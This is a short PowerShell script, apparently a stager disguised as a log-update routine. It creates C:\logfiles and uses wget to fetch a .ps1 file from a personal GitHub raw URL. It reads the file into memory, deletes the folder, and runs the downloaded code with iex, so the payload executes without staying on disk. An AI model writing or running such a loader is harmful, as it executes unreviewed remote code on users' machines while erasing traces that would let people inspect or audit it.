powershell -command "New-Item -Path 'c:\' -Name 'logfiles' -ItemType 'directory'"
powershell -command "wget https://raw.githubusercontent.com/daniel0011234/myscripts/main/update_runner_living.ps1 -OutFile C:\logfiles\log_updates.ps1"
Start-Sleep -s 20
$text = Get-Content -path 'C:\logfiles\log_updates.ps1' -Raw
Start-Sleep -s 20
Remove-Item "C:\logfiles" -Recurse -Force
iex($text)

